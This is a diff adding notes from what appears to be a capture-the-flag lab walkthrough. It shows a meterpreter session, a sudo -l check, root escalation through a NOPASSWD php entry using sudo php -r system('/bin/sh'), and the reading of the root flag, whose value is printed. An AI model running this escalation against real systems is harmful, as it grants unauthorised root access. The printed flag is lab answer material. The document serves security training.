@@ -103,6 +103,24 @@ netcat can be used to connect to any listening port and interact with the servic
 
 
   
+meterpreter > sudo -l
+[-] Unknown command: sudo
+meterpreter > shell
+Process 2076 created.
+Channel 0 created.
+sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+CMD="/bin/sh"
+sudo php -r "system('$CMD');"
+whoami
+root
+cd /root
+cat root.txt
+f1fba6e9f71efb2630e6e34da6387842
 
   
 ##########################################################################################
